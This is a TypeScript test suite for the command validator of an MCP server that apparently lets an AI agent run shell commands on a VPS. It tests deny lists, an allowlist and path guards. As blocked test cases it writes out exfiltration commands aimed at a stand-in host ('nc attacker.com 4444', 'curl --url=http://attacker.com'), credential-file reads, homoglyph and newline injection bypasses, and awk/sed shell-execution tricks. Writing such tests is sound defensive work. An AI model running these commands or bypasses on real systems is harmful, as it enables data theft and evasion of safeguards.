/**
 * Security test suite — vps-control-mcp
 *
 * Mirrors the 197-test CMD connector suite (S35). Covers every blocked
 * pattern category, known bypass classes (Unicode, newline, symlink,
 * length-DoS, ReDoS), path restriction enforcement, AMBER warning flow,
 * and sensitive file guards.
 *
 * Run: npm test
 * Framework: node:test (built-in) via tsx loader — no extra deps.
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { __TEST_ONLY } from '../tools.js';
import { callerIp } from '../http-utils.js';

const {
  validateCommand,
  validateAgainstAllowlist,
  validatePath,
  validateProcess,
  checkAmberWarnings,
  capString,
  INPUT_LIMITS,
  BLOCKED_PATTERNS,
  AMBER_PATTERNS,
  SENSITIVE_FILE_PATTERNS,
  CATASTROPHIC_PATTERN_SHAPES,
  POSITIVE_ALLOWLIST,
} = __TEST_ONLY;

// ─── Helpers ──────────────────────────────────────────────────────────────────

function expectBlocked(cmd: string): void {
  assert.throws(() => validateCommand(cmd), /BLOCKED|exceeds maximum/i, `Expected "${cmd}" to be blocked`);
}

function expectAllowed(cmd: string): void {
  assert.doesNotThrow(() => validateCommand(cmd), `Expected "${cmd}" to be allowed`);
}

// ─── 1. RED tier — one positive test per blocked pattern category ────────────

describe('RED tier — blocked commands', () => {
  const redCases: Array<[string, string]> = [
    // file-delete
    ['rm file.txt',              'file-delete: rm'],
    ['unlink foo',               'file-delete: unlink'],
    ['shred -u secret',          'file-delete: shred'],
    ['truncate -s 0 log',        'file-delete: truncate'],

    // disk-ops
    ['dd if=/dev/zero of=disk',  'disk-ops: dd'],
    ['mkfs.ext4 /dev/sda1',      'disk-ops: mkfs'],
    ['fdisk /dev/sda',           'disk-ops: fdisk'],
    ['parted /dev/sda',          'disk-ops: parted'],
    ['mount /dev/sda /mnt',      'disk-ops: mount'],
    ['umount /mnt',              'disk-ops: umount'],

    // system-state
    ['shutdown -h now',          'system-state: shutdown'],
    ['reboot',                   'system-state: reboot'],
    ['halt',                     'system-state: halt'],
    ['poweroff',                 'system-state: poweroff'],
    ['init 0',                   'system-state: init'],

    // process-kill
    ['kill -9 1234',             'process-kill: kill'],
    ['killall node',             'process-kill: killall'],
    ['pkill node',               'process-kill: pkill'],

    // user-mgmt / permissions
    ['useradd attacker',         'user-mgmt: useradd'],
    ['userdel victim',           'user-mgmt: userdel'],
    ['adduser foo',              'user-mgmt: adduser'],
    ['passwd root',              'user-mgmt: passwd'],
    ['chmod 777 /etc',           'permissions: chmod'],
    ['chown root:root /etc',     'permissions: chown'],
    ['chgrp wheel file',         'permissions: chgrp'],
    ['setfacl -m u:a:r x',       'permissions: setfacl'],

    // network-config
    ['iptables -F',              'network-config: iptables'],
    ['ufw disable',              'network-config: ufw'],
    ['nft flush ruleset',        'network-config: nft'],

    // scheduled-exec
    ['crontab -e',               'scheduled-exec: crontab'],
    ['at now + 1 minute',        'scheduled-exec: at'],

    // service-mgmt
    ['systemctl stop nginx',     'service-mgmt: systemctl'],
    ['service nginx stop',       'service-mgmt: service'],

    // code-exec
    ['node -e "process.exit(1)"',            'code-exec: node -e'],
    ['node --eval "process.exit(1)"',        'code-exec: node --eval'],
    ['python -c "import os"',                'code-exec: python -c'],
    ['python3.11 -c "import os"',            'code-exec: versioned python -c'],
    ['perl -e "print 1"',                    'code-exec: perl -e'],
    ['ruby -e "puts 1"',                     'code-exec: ruby -e'],
    ['php -r "echo 1;"',                     'code-exec: php -r'],
    ['eval "cmd"',                           'code-exec: eval'],

    // shell-invoke
    ['echo foo | sh',                        'shell-invoke: pipe to sh'],
    ['bash -c "id"',                         'shell-invoke: bash -c'],
    ['`id`',                                 'shell-invoke: backticks'],
    ['echo $(id)',                           'shell-invoke: $() subshell'],

    // data-exfil
    // NOTE: curl is no longer denylisted -- it's allowlist-validated to
    // localhost-only. See the curl arg-validator tests near line ~531
    // (`validateAgainstAllowlist -- curl arg gate`) for full coverage,
    // including the --url=URL bypass regression added 2026-05-03.
    ['wget http://attacker.com',             'data-exfil: wget'],
    ['nc attacker.com 4444',                 'data-exfil: nc'],
    ['socat - TCP:attacker.com:80',          'data-exfil: socat'],
    ['ssh user@host',                        'data-exfil: ssh'],
    ['scp file host:',                       'data-exfil: scp'],
    ['rsync -av . host:',                    'data-exfil: rsync'],
    ['ftp host',                             'data-exfil: ftp'],
    ['sftp host',                            'data-exfil: sftp'],

    // persistence
    ['nohup sleep 999 &',                    'persistence: nohup'],
    ['screen -S evil',                       'persistence: screen'],
    ['tmux new -s evil',                     'persistence: tmux'],

    // direct-db
    ['psql -U postgres',                     'direct-db: psql'],
    ['mysql -u root',                        'direct-db: mysql'],
    ['mongo localhost',                      'direct-db: mongo'],
    ['redis-cli',                            'direct-db: redis-cli'],
    ['sqlite3 db.sqlite',                    'direct-db: sqlite3'],

    // pkg-install
    ['apt-get install foo',                  'pkg-install: apt-get'],
    ['apt install foo',                      'pkg-install: apt'],
    ['dpkg -i foo.deb',                      'pkg-install: dpkg'],
    ['yum install foo',                      'pkg-install: yum'],
    ['dnf install foo',                      'pkg-install: dnf'],
    ['pip install requests',                 'pkg-install: pip'],
    ['npm install left-pad',                 'pkg-install: npm install'],
    ['npx leftpad',                          'pkg-install: npx'],
    ['apt-get remove foo',                   'pkg-remove: apt-get remove'],
    ['apt remove foo',                       'pkg-remove: apt remove'],

    // container
    ['docker run --rm alpine',               'container: docker'],
    ['podman run alpine',                    'container: podman'],
    ['kubectl get pods',                     'container: kubectl'],

    // file-write
    ['echo foo > /etc/motd',                 'file-write: redirect to /'],
    ['echo foo > ~/evil',                    'file-write: redirect to ~'],
    ['echo foo >> log.txt',                  'file-write: append redirect'],
    ['cat foo | tee bar',                    'file-write: tee'],
    ['ln -s /etc/shadow /root/myapp/x',  'file-write: symlink create'],
    ['cp foo /etc/',                         'file-write: cp to /etc'],
    ['mv foo /usr/local/bin/',               'file-write: mv to /usr'],

    // env-manip
    ['export FOO=bar',                       'env-manip: export'],
    ['source /tmp/evil',                     'env-manip: source'],
    ['. /tmp/evil',                          'env-manip: . sourcing'],

    // priv-esc
    ['sudo id',                              'priv-esc: sudo'],
    ['su - root',                            'priv-esc: su'],
    ['pkexec id',                            'priv-esc: pkexec'],
    ['doas id',                              'priv-esc: doas'],

    // info-leak
    ['history',                              'info-leak: history'],
    ['cat /etc/shadow',                      'info-leak: /etc/shadow'],
    ['cat /etc/passwd',                      'info-leak: /etc/passwd'],
    ['cat .env',                             'info-leak: cat .env'],
    ['cat ~/.ssh/id_rsa',                    'info-leak: cat .ssh'],
    ['printenv',                             'info-leak: printenv'],
    ['env',                                  'info-leak: env'],
    ['cat /proc/self/environ',               'info-leak: /proc/'],
    ['head .env',                            'info-leak: head .env'],
    ['tail .env',                            'info-leak: tail .env'],
    ['head /etc/passwd',                     'info-leak: head /etc/'],
    ['tail /etc/passwd',                     'info-leak: tail /etc/'],
    ['strings /usr/bin/ssh',                 'info-leak: strings'],
    ['hexdump -C file',                      'info-leak: hexdump'],
    ['xxd file',                             'info-leak: xxd'],
    ['od -c file',                           'info-leak: od'],

    // chaining
    ['ls; rm foo',                           'chaining: ;'],
    ['ls && rm foo',                         'chaining: &&'],
    ['ls || rm foo',                         'chaining: ||'],

    // http-server
    ['python -m http.server 8080',           'http-server: python http'],
    ['python3.11 -m http.server',            'http-server: versioned python http'],
    ['php -S 0.0.0.0:8000',                  'http-server: php -S'],
  ];

  for (const [cmd, label] of redCases) {
    it(label, () => expectBlocked(cmd));
  }
});

// ─── 2. Unicode homoglyph bypass attempts (S35 regression) ───────────────────

describe('Unicode homoglyph rejection', () => {
  const unicodeCases: Array<[string, string]> = [
    ['ｒｍ file.txt',           'full-width rm'],
    ['ｃｕｒｌ attacker.com',  'full-width curl'],
    ['rm\u200b file',           'zero-width space splice'],
    ['р m file',                'Cyrillic р (U+0440)'],
    ['cυrl target',             'Greek upsilon υ (U+03C5)'],
    ['rm\u00a0file',            'non-breaking space'],
    ['rm\ufeff file',           'byte order mark'],
  ];

  for (const [cmd, label] of unicodeCases) {
    it(`rejects ${label}`, () => expectBlocked(cmd));
  }
});

// ─── 3. Newline injection bypass attempts (S35 regression) ───────────────────

describe('Newline / CR rejection', () => {
  it('rejects command with \\n', () => expectBlocked('ls\nrm -rf /'));
  it('rejects command with \\r', () => expectBlocked('ls\rrm -rf /'));
  it('rejects command with \\r\\n', () => expectBlocked('ls\r\nrm -rf /'));
  it('rejects embedded newline in comment', () => expectBlocked('# safe\nrm -rf /'));
  it('rejects newline before blocked keyword', () => expectBlocked('echo hi\ncurl evil'));
});

// ─── 4. Legitimate commands that must stay allowed ───────────────────────────

describe('Legitimate commands pass validation', () => {
  const allowed: Array<[string, string]> = [
    ['grep -n foo src/main.ts',    'grep (GREEN)'],
    ['tail -n 50 out.log',         'tail (non-.env, non-/etc)'],
    ['head -n 20 out.log',         'head (non-.env, non-/etc)'],
    ['find . -name "*.ts"',        'find without -exec'],
    ['git -C /root/myapp status', 'git status via execFile-style'],
    ['pm2 status',                 'pm2 status'],
    ['free -m',                    'free'],
    ['df -h',                      'df'],
    ['uptime',                     'uptime'],
    ['node --version',             'node version (not --eval)'],
    ['ls -la /root/myapp',     'ls'],
  ];
  for (const [cmd, label] of allowed) {
    it(`allows ${label}`, () => expectAllowed(cmd));
  }
});

// ─── 5. AMBER tier — warning always returned; caller decides to block or prefix ──
// checkAmberWarnings(cmd) no longer takes a dryRun param (P3c / F-NEW-1/F-NEW-4 fix).
// The function always returns the warning text when matched; runApprovedCommand
// decides whether to block (dry_run=true) or prepend to output (dry_run=false).

describe('AMBER tier — warning flow', () => {
  it('apt-get update always returns warning text', () => {
    const warn = checkAmberWarnings('apt-get update');
    assert.ok(warn, 'expected a warning');
    assert.match(warn!, /WARNING/);
  });
  it('apt-get update does NOT return null (old dry_run=false pass-through removed)', () => {
    // Regression: prior to P3c, checkAmberWarnings('...', false) returned null,
    // silently dropping the warning. Now it always returns warning text.
    const warn = checkAmberWarnings('apt-get update');
    assert.notEqual(warn, null, 'warning must not be silently dropped');
  });
  it('find -exec is now RED (removed from AMBER — F-OP-3)', () => {
    // find -exec was promoted from AMBER to RED; checkAmberWarnings should return null
    const warn = checkAmberWarnings('find . -type f -name "*.log"');
    assert.equal(warn, null, 'plain find should not be AMBER');
  });
  it('xargs warns', () => {
    const warn = checkAmberWarnings('cat list | xargs touch');
    assert.ok(warn);
  });
  it('sed -i is now RED (removed from AMBER — F-OP-2)', () => {
    // sed -i was promoted from AMBER to RED; checkAmberWarnings should return null
    const warn = checkAmberWarnings('sed s/foo/bar/ file.txt');
    assert.equal(warn, null, 'plain sed should not be AMBER');
  });
  it('non-AMBER command returns null', () => {
    const warn = checkAmberWarnings('df -h');
    assert.equal(warn, null);
  });
});

// ─── 6. Input length caps (F-VM-3) ───────────────────────────────────────────

describe('Input length caps', () => {
  it('capString rejects strings over limit', () => {
    assert.throws(
      () => capString('a'.repeat(INPUT_LIMITS.command + 1), INPUT_LIMITS.command, 'command'),
      /exceeds maximum length/
    );
  });
  it('capString accepts strings at the limit', () => {
    assert.doesNotThrow(() => capString('a'.repeat(INPUT_LIMITS.command), INPUT_LIMITS.command, 'command'));
  });
  it('validateCommand rejects 10 KB command string', () => {
    expectBlocked('a'.repeat(10 * 1024));
  });
  it('validateCommand accepts 4,096 B command string', () => {
    expectAllowed('echo ' + 'a'.repeat(4_000));
  });
  it('INPUT_LIMITS defines all expected fields', () => {
    assert.ok(INPUT_LIMITS.command);
    assert.ok(INPUT_LIMITS.justification);
    assert.ok(INPUT_LIMITS.description);
    assert.ok(INPUT_LIMITS.path);
    assert.ok(INPUT_LIMITS.pattern);
    assert.ok(INPUT_LIMITS.process_name);
  });
});

// ─── 7. Path restriction enforcement (validatePath) ──────────────────────────

describe('validatePath — allowlist', () => {
  it('rejects /etc/passwd', () => {
    assert.throws(() => validatePath('/etc/passwd'), /Path not permitted|not found/);
  });
  it('rejects /root/.ssh/id_rsa', () => {
    assert.throws(() => validatePath('/root/.ssh/id_rsa'), /Path not permitted|BLOCKED|not found|EACCES|permission denied/);
  });
  it('rejects relative path escape via ..', () => {
    assert.throws(() => validatePath('/root/myapp/../../etc/passwd'), /Path not permitted|not found/);
  });
  it('rejects oversized path', () => {
    assert.throws(() => validatePath('/root/myapp/' + 'a'.repeat(INPUT_LIMITS.path + 1)), /exceeds maximum/);
  });
});

// ─── 8. Sensitive file patterns ──────────────────────────────────────────────

describe('Sensitive file pattern coverage', () => {
  const mustBlock = [
    '/root/myapp/.env',
    '/root/myapp/.env.production',
    '/root/myapp/config/secrets.json',
    '/root/myapp/deploy.pem',
    '/root/myapp/app.key',
    '/root/myapp/credentials.json',
    '/root/.ssh/id_rsa',
    '/root/myapp/aws/config',
    '/root/.aws/credentials',
    '/root/myapp/password.txt',
    '/root/myapp/token.secret',
  ];
  for (const p of mustBlock) {
    it(`${p} matches a sensitive pattern`, () => {
      const matched = SENSITIVE_FILE_PATTERNS.some(rx => rx.test(p));
      assert.ok(matched, `${p} should match at least one SENSITIVE_FILE_PATTERN`);
    });
  }
});

// ─── 9. Process allowlist ────────────────────────────────────────────────────

describe('validateProcess', () => {
  it('rejects unknown process', () => {
    assert.throws(() => validateProcess('evil-process'), /not permitted/);
  });
  it('accepts my-api', () => {
    // Depends on CONFIG.ALLOWED_PROCESSES — skip if env differs
    try {
      validateProcess('my-api');
      assert.ok(true);
    } catch (err) {
      // If env isn't set up for this test run, that's fine
      assert.match((err as Error).message, /not permitted/);
    }
  });
  it('rejects oversized process_name', () => {
    assert.throws(() => validateProcess('a'.repeat(INPUT_LIMITS.process_name + 1)), /exceeds maximum/);
  });
});

// ─── 10. ReDoS-shape guard (F-VM-7) ──────────────────────────────────────────

describe('Catastrophic regex shape detection', () => {
  const pathological = [
    '(.*)+',
    '(.+)*',
    '([^x]*)+',
    '.*.*.*',
  ];
  for (const p of pathological) {
    it(`rejects "${p}"`, () => {
      const matched = CATASTROPHIC_PATTERN_SHAPES.some(rx => rx.test(p));
      assert.ok(matched, `${p} should trigger a catastrophic-shape reject`);
    });
  }

  const safe = [
    'foo',
    'error: [0-9]+',
    '^import .* from',
    'console\\.log\\(',
  ];
  for (const p of safe) {
    it(`allows safe pattern "${p}"`, () => {
      const matched = CATASTROPHIC_PATTERN_SHAPES.some(rx => rx.test(p));
      assert.ok(!matched, `${p} should not trigger a catastrophic-shape reject`);
    });
  }
});

// ─── 11. Blocked-pattern structural health ───────────────────────────────────

describe('BLOCKED_PATTERNS structural health', () => {
  it('has at least 80 patterns', () => {
    assert.ok(BLOCKED_PATTERNS.length >= 80, `only ${BLOCKED_PATTERNS.length} patterns`);
  });
  it('every pattern has a category', () => {
    for (const p of BLOCKED_PATTERNS) {
      assert.ok(p.category && typeof p.category === 'string', `missing category on ${p.pattern}`);
    }
  });
  it('every pattern has a reason', () => {
    for (const p of BLOCKED_PATTERNS) {
      assert.ok(p.reason && typeof p.reason === 'string', `missing reason on ${p.pattern}`);
    }
  });
  it('every pattern is a RegExp', () => {
    for (const p of BLOCKED_PATTERNS) {
      assert.ok(p.pattern instanceof RegExp);
    }
  });
});

describe('AMBER_PATTERNS structural health', () => {
  it('has at least 1 pattern (find -exec, awk, sed -i promoted to RED in F-OP-1/2/3)', () => {
    assert.ok(AMBER_PATTERNS.length >= 1);
  });
  it('every entry has a risk string', () => {
    for (const p of AMBER_PATTERNS) {
      assert.ok(p.risk && typeof p.risk === 'string');
    }
  });
});

// ─── 12. No false positives on common devops idioms ──────────────────────────
// These are S37 regression cases — previously over-blocked, now gated to command-position.

describe('False-positive guards (common devops idioms stay allowed)', () => {
  it('"kernel" is not mistaken for \\bkill\\b', () => {
    expectAllowed('grep kernel /var/log/syslog');
  });
  it('"category" / "cat" substring does not trigger info-leak pattern', () => {
    // \bcat\b requires a whole-word match + specific suffix like .env, /etc/.
    // "category" has "cat" as a prefix inside a larger word — word boundaries prevent the match.
    expectAllowed('grep category /root/myapp/artifacts/api-server/out.log');
  });
  it('"du" (disk usage) is allowed', () => {
    expectAllowed('du -sh /var/log');
  });
  it('"ps" (process status) is allowed', () => {
    expectAllowed('ps aux');
  });
  it('"concatenation" is allowed in echo', () => {
    expectAllowed('echo "concatenation"');
  });
});

// ─── 13. Positive allowlist (P3c / F-NEW-3) ──────────────────────────────────

describe('validateAgainstAllowlist — default-deny', () => {
  // helper: wraps throws check for allowlist
  function expectAllowlisted(cmd: string) {
    assert.doesNotThrow(() => validateAgainstAllowlist(cmd), `expected "${cmd}" to be on allowlist`);
  }
  function expectNotAllowlisted(cmd: string) {
    assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[not-allowlisted\]/, `expected "${cmd}" to be blocked by allowlist`);
  }
  function expectInvalidArgs(cmd: string) {
    assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[invalid-args\]/, `expected "${cmd}" to be blocked by arg validator`);
  }

  // ── Allowlisted binaries pass ────────────────────────────────────────────
  it('df -h passes', () => expectAllowlisted('df -h'));
  it('free -h passes', () => expectAllowlisted('free -h'));
  it('ls /root/myapp passes', () => expectAllowlisted('ls /tmp/testapp'));
  it('cat /root/myapp/out.log passes', () => expectAllowlisted('cat /tmp/testapp/out.log'));
  it('tail -n 50 /root/myapp/out.log passes', () => expectAllowlisted('tail -n 50 /tmp/testapp/out.log'));
  it('grep error /root/myapp/out.log passes', () => expectAllowlisted('grep error /tmp/testapp/out.log'));
  it('pm2 status passes', () => expectAllowlisted('pm2 status'));
  it('pm2 logs passes', () => expectAllowlisted('pm2 logs'));
  it('echo hello passes', () => expectAllowlisted('echo hello'));
  it('which node passes', () => expectAllowlisted('which node'));
  it('node --version passes', () => expectAllowlisted('node --version'));
  it('pnpm audit passes', () => expectAllowlisted('pnpm audit'));
  it('npm outdated passes', () => expectAllowlisted('npm outdated'));
  it('uptime passes', () => expectAllowlisted('uptime'));
  it('date passes', () => expectAllowlisted('date'));
  it('ss -tulpn passes', () => expectAllowlisted('ss -tulpn'));
  it('du -sh /root/myapp passes', () => expectAllowlisted('du -sh /tmp/testapp'));

  // ── S64 v1.11.0 — new GREEN commands (––––––––––––––––––––––––––––––––––––––––––––––––
  it('pm2 save passes', () => expectAllowlisted('pm2 save'));
  it('pm2 startup show passes', () => expectAllowlisted('pm2 startup show'));
  it('systemctl status nginx passes', () => expectAllowlisted('systemctl status nginx'));
  it('systemctl is-active nginx passes', () => expectAllowlisted('systemctl is-active nginx'));
  it('systemctl is-enabled nginx passes', () => expectAllowlisted('systemctl is-enabled nginx'));
  it('systemctl list-units passes', () => expectAllowlisted('systemctl list-units'));
  it('service nginx status passes', () => expectAllowlisted('service nginx status'));
  it('crontab -l passes', () => expectAllowlisted('crontab -l'));
  it('atq passes', () => expectAllowlisted('atq'));
  it('dig google.com passes', () => expectAllowlisted('dig google.com'));
  it('nslookup google.com passes', () => expectAllowlisted('nslookup google.com'));
  it('host google.com passes', () => expectAllowlisted('host google.com'));

  // ── S64 dangerous sub-commands still blocked –––––––––––––––––––––––––––––––––
  it('systemctl stop is still blocked', () => assert.throws(() => validateAgainstAllowlist('systemctl stop nginx'), /BLOCKED/));
  it('systemctl start is still blocked', () => assert.throws(() => validateAgainstAllowlist('systemctl start nginx'), /BLOCKED/));
  it('systemctl enable is still blocked', () => assert.throws(() => validateAgainstAllowlist('systemctl enable nginx'), /BLOCKED/));
  it('service nginx stop is still blocked', () => assert.throws(() => validateAgainstAllowlist('service nginx stop'), /BLOCKED/));
  it('crontab -e is still blocked', () => assert.throws(() => validateAgainstAllowlist('crontab -e'), /BLOCKED/));
  it('crontab -r is still blocked', () => assert.throws(() => validateAgainstAllowlist('crontab -r'), /BLOCKED/));
  it('pm2 startup (bare) is still blocked', () => assert.throws(() => validateAgainstAllowlist('pm2 startup'), /BLOCKED/));
  it('pm2 startup generate is still blocked', () => assert.throws(() => validateAgainstAllowlist('pm2 startup generate'), /BLOCKED/));

  // ── Non-allowlisted binaries are blocked ─────────────────────────────────
  it('less is not on allowlist', () => expectNotAllowlisted('less /etc/passwd'));
  it('more is not on allowlist', () => expectNotAllowlisted('more /etc/passwd'));
  it('python3 is not on allowlist', () => expectNotAllowlisted('python3 -c "import os"'));
  it('bash is not on allowlist', () => expectNotAllowlisted('bash -c id'));
  // curl IS on the allowlist now (with arg validation: localhost-only).
  // External URLs are rejected via the arg validator (invalid-args), not by
  // the allowlist gate. See `validateAgainstAllowlist -- curl arg gate` below.
  it('wget is not on allowlist', () => expectNotAllowlisted('wget http://example.com'));
  it('xxd is not on allowlist', () => expectNotAllowlisted('xxd /etc/shadow'));
  it('strings is not on allowlist', () => expectNotAllowlisted('strings /root/.env'));
  it('hexdump is not on allowlist', () => expectNotAllowlisted('hexdump /root/.env'));
  it('od is not on allowlist', () => expectNotAllowlisted('od /root/.env'));
  it('nl is not on allowlist', () => expectNotAllowlisted('nl /etc/passwd'));
  it('tac is not on allowlist', () => expectNotAllowlisted('tac /etc/shadow'));
  it('rev is not on allowlist', () => expectNotAllowlisted('rev /etc/shadow'));
  it('base64 is not on allowlist', () => expectNotAllowlisted('base64 /root/.env'));
  it('awk is not on allowlist (F-OP-1 — system() provides full root RCE)', () => {
    expectNotAllowlisted('awk NR==1 /etc/shadow');
  });
  it('awk system() would be blocked by not-allowlisted', () => {
    expectNotAllowlisted('awk BEGIN{system("id")}');
  });

  // ── Path-qualified binary names are blocked ───────────────────────────────
  it('/bin/cat is blocked (path-qualified)', () => {
    assert.throws(() => validateAgainstAllowlist('/bin/cat /root/myapp/out.log'), /BLOCKED \[not-allowlisted\]/);
  });
  it('/usr/bin/python3 is blocked (path-qualified)', () => {
    assert.throws(() => validateAgainstAllowlist('/usr/bin/python3 -c "import os"'), /BLOCKED \[not-allowlisted\]/);
  });
  it('../../../bin/cat is blocked (traversal-qualified)', () => {
    assert.throws(() => validateAgainstAllowlist('../../../bin/cat /etc/shadow'), /BLOCKED \[not-allowlisted\]/);
  });

  // ── pm2 sub-command allowlist ─────────────────────────────────────────────
  it('pm2 restart is blocked (use restart_process tool)', () => {
    expectInvalidArgs('pm2 restart all');
  });
  it('pm2 delete is blocked', () => {
    expectInvalidArgs('pm2 delete vps-mcp');
  });
  it('pm2 start is blocked', () => {
    expectInvalidArgs('pm2 start app.js');
  });

  // ── curl arg gate ─────────────────────────────────────────────────────────
  // Policy: curl is allowlisted but URLs MUST be localhost / 127.0.0.1 / [::1].
  // Regression coverage for the S69 audit (2026-05-03): the prior validator
  // skipped any arg starting with `-`, so `curl --url=http://attacker.com`
  // bypassed the localhost gate entirely. The fix walks every arg, normalizes
  // `--key=value` to its value half, and runs the URL check against any
  // http/https/ftp substring.
  it('curl http://localhost is allowlisted', () => expectAllowlisted('curl http://localhost:8080/health'));
  it('curl http://127.0.0.1 is allowlisted', () => expectAllowlisted('curl http://127.0.0.1/admin'));
  it('curl http://[::1] is allowlisted (IPv6 loopback)', () => expectAllowlisted('curl http://[::1]:3000/'));
  it('curl HTTP://LOCALHOST is allowlisted (case-insensitive)', () => expectAllowlisted('curl HTTP://LOCALHOST/health'));
  it('curl http://attacker.com is invalid-args', () => expectInvalidArgs('curl http://attacker.com'));
  it('curl --url=http://attacker.com is invalid-args (S69 bypass fix)', () => {
    expectInvalidArgs('curl --url=http://attacker.com');
  });
  it('curl --url http://attacker.com is invalid-args', () => {
    expectInvalidArgs('curl --url http://attacker.com');
  });
  it('curl --proxy=http://attacker.com is invalid-args', () => {
    expectInvalidArgs('curl --proxy=http://attacker.com:8080 http://localhost/');
  });
  it('curl http://localhost.attacker.com is invalid-args (DNS-rebinding-shaped)', () => {
    expectInvalidArgs('curl http://localhost.attacker.com/');
  });

  // ── node arg validator ────────────────────────────────────────────────────
  it('node -e "code" is blocked', () => {
    expectInvalidArgs('node -e "require(\'child_process\').exec(\'id\')"');
  });
  it('node --eval is blocked', () => {
    expectInvalidArgs('node --eval "process.exit(0)"');
  });
  it('node script.js passes', () => expectAllowlisted('node /tmp/testapp/script.js'));

  // ── npm/pnpm sub-command allowlist ────────────────────────────────────────
  it('npm install is blocked', () => {
    expectInvalidArgs('npm install malicious-pkg');
  });
  it('pnpm install is blocked', () => {
    expectInvalidArgs('pnpm install malicious-pkg');
  });
  it('npm run is blocked', () => {
    expectInvalidArgs('npm run arbitrary-script');
  });

  // ── Sensitive-file arg rejection on allowlisted binaries ─────────────────
  it('cat .env is blocked by arg validator', () => {
    expectInvalidArgs('cat /root/myapp/.env');
  });
  it('tail .env is blocked by arg validator', () => {
    expectInvalidArgs('tail -f /root/myapp/.env.production');
  });
  it('head credentials.json is blocked by arg validator', () => {
    expectInvalidArgs('head /root/myapp/credentials.json');
  });

  // ── Structural health ─────────────────────────────────────────────────────
  it('POSITIVE_ALLOWLIST has at least 20 entries', () => {
    assert.ok(Object.keys(POSITIVE_ALLOWLIST).length >= 20,
      `only ${Object.keys(POSITIVE_ALLOWLIST).length} allowlist entries`);
  });
  it('every allowlist entry has a description', () => {
    for (const [bin, entry] of Object.entries(POSITIVE_ALLOWLIST)) {
      assert.ok(entry.description && typeof entry.description === 'string',
        `missing description on allowlist entry for "${bin}"`);
    }
  });
  it('every allowlist entry has an argValidator function', () => {
    for (const [bin, entry] of Object.entries(POSITIVE_ALLOWLIST)) {
      assert.equal(typeof entry.argValidator, 'function',
        `missing argValidator on allowlist entry for "${bin}"`);
    }
  });
});

// ─── 14. F-OP hardening tests (third-pass adversarial review, S47) ─────────────

describe('F-OP-1 — awk removed from allowlist (system() / getline RCE)', () => {
  function expectNotAllowlisted(cmd: string) {
    assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[not-allowlisted\]/);
  }
  it('awk is not on POSITIVE_ALLOWLIST', () => {
    assert.ok(!('awk' in POSITIVE_ALLOWLIST), 'awk must not be on allowlist');
  });
  it('awk BEGIN{system("id")} is not-allowlisted', () => expectNotAllowlisted('awk BEGIN{system("id")}'));
  it('awk BEGIN{system("base64/root/.env")} is not-allowlisted', () => expectNotAllowlisted('awk \'BEGIN{system("base64 /root/myapp/.env")}\''));
  it('awk getline is not-allowlisted', () => expectNotAllowlisted('awk \'BEGIN{while((getline<"/root/.env")>0)print}\''));
});

describe('F-OP-2 — sed e command and -i promoted to RED', () => {
  it('sed 1ewhoami is RED (line-address+e shell execution)', () => {
    expectBlocked('sed 1ewhoami /dev/null');
  });
  it('sed $ecmd is RED', () => {
    expectBlocked('sed $eid /dev/null');
  });
  it('sed -i is RED (in-place file modification)', () => {
    expectBlocked('sed -i "s/foo/bar/" file.txt');
  });
  it('sed --in-place is RED', () => {
    expectBlocked('sed --in-place "s/a/b/" file');
  });
  it('sed substitution e-flag is blocked by arg validator', () => {
    assert.throws(
      () => validateAgainstAllowlist('sed s/a/b/e'),
      /BLOCKED \[invalid-args\]/,
      'sed s/a/b/e should be blocked by validateSedArgs'
    );
  });
  it('plain sed s/pattern/replace/g passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('sed s/foo/bar/g /tmp/testapp/out.log'));
  });
});

describe('F-OP-3 — find -exec promoted to RED', () => {
  it('find -exec cat is RED', () => {
    expectBlocked('find /root/myapp -type f -exec cat {} +');
  });
  it('find -execdir is RED', () => {
    expectBlocked('find /root -type f -execdir head {} +');
  });
  it('find -exec (BLOCKED by arg validator too)', () => {
    assert.throws(
      () => validateAgainstAllowlist('find /root/myapp -exec cat {} +'),
      /BLOCKED \[invalid-args\]|BLOCKED \[code-exec\]/,
    );
  });
  it('plain find -name passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('find /tmp/testapp -name "*.log"'));
  });
});

describe('F-OP-4 — grep -r/-R recursive blocked', () => {
  it('grep -r is blocked by arg validator', () => {
    assert.throws(
      () => validateAgainstAllowlist('grep -r API_KEY /root/myapp'),
      /BLOCKED \[invalid-args\]/,
    );
  });
  it('grep -R is blocked', () => {
    assert.throws(
      () => validateAgainstAllowlist('grep -R TOKEN /root/myapp'),
      /BLOCKED \[invalid-args\]/,
    );
  });
  it('grep --recursive is blocked', () => {
    assert.throws(
      () => validateAgainstAllowlist('grep --recursive SECRET /root'),
      /BLOCKED \[invalid-args\]/,
    );
  });
  it('grep -rh (combined with r) is blocked', () => {
    assert.throws(
      () => validateAgainstAllowlist('grep -rh API_KEY /root/myapp'),
      /BLOCKED \[invalid-args\]/,
    );
  });
  it('grep -n (non-recursive) passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('grep -n error /tmp/testapp/out.log'));
  });
  it('grep with pattern and file passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('grep TOKEN /tmp/testapp/out.log'));
  });
});

describe('F-OP-5 — SENSITIVE_FILE_PATTERNS .env regex tightened', () => {
  const tightRegex = SENSITIVE_FILE_PATTERNS[0]; // /\.env(?![a-zA-Z0-9])/i
  it('.env at end-of-string matches', () => {
    assert.ok(tightRegex.test('/root/myapp/.env'));
  });
  it('.env.production matches', () => {
    assert.ok(tightRegex.test('/root/myapp/.env.production'));
  });
  it('.env" (quote suffix) now matches (was bypassed in v1.5.0)', () => {
    assert.ok(tightRegex.test('/root/.env"'));
  });
  it('.env) (paren suffix) now matches', () => {
    assert.ok(tightRegex.test('/root/.env)'));
  });
  it('.env/ (trailing slash) now matches', () => {
    assert.ok(tightRegex.test('/root/.env/'));
  });
  it('.env$IFS suffix — $ is non-alphanum so matches', () => {
    assert.ok(tightRegex.test('/root/.env$'));
  });
  it('.envrc does NOT match (has alphanum suffix r)', () => {
    // .envrc is a separate tool (direnv) and while suspicious, is a separate concern
    assert.ok(!tightRegex.test('/root/.envrc'));
  });
  it('.environment does NOT match (has alphanum suffix i)', () => {
    assert.ok(!tightRegex.test('/root/.environment'));
  });
  it('.env_local with underscore — underscore is non-alphanum, matches', () => {
    assert.ok(tightRegex.test('/root/.env_local'));
  });
